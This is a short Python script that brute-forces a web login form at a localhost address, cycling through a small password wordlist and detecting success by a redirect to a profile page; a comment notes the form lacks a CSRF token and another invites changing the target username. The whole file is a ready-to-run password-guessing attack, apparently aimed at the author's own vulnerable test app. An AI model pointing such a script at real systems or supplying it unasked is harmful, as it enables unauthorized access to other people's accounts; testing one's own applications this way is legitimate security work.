import requests

URL = "http://127.0.0.1:8000/accounts/login/"
USERNAME = "example"  # change to target username
WORDLIST = ["admin", "123456", "password", "admin123", "letmein"]

def try_login(session, username, password):
    data = {
        "username": username,
        "password": password,
    }
    # no CSRF token in vulnerable form, so plain POST is enough
    r = session.post(URL, data=data, allow_redirects=False)
    # success in your app redirects to profile
    success = r.status_code == 302 and "/accounts/profile" in (r.headers.get("Location") or "")
    return success, r

def main():
    s = requests.Session()
    for pwd in WORDLIST:
        ok, resp = try_login(s, USERNAME, pwd)
        print(f"Trying {USERNAME}:{pwd} -> {resp.status_code} {resp.headers.get('Location')}")
        if ok:
            print(f"[+] Password found: {pwd}")
            break
    else:
        print("[-] No password found in wordlist")

if __name__ == "__main__":
    main()
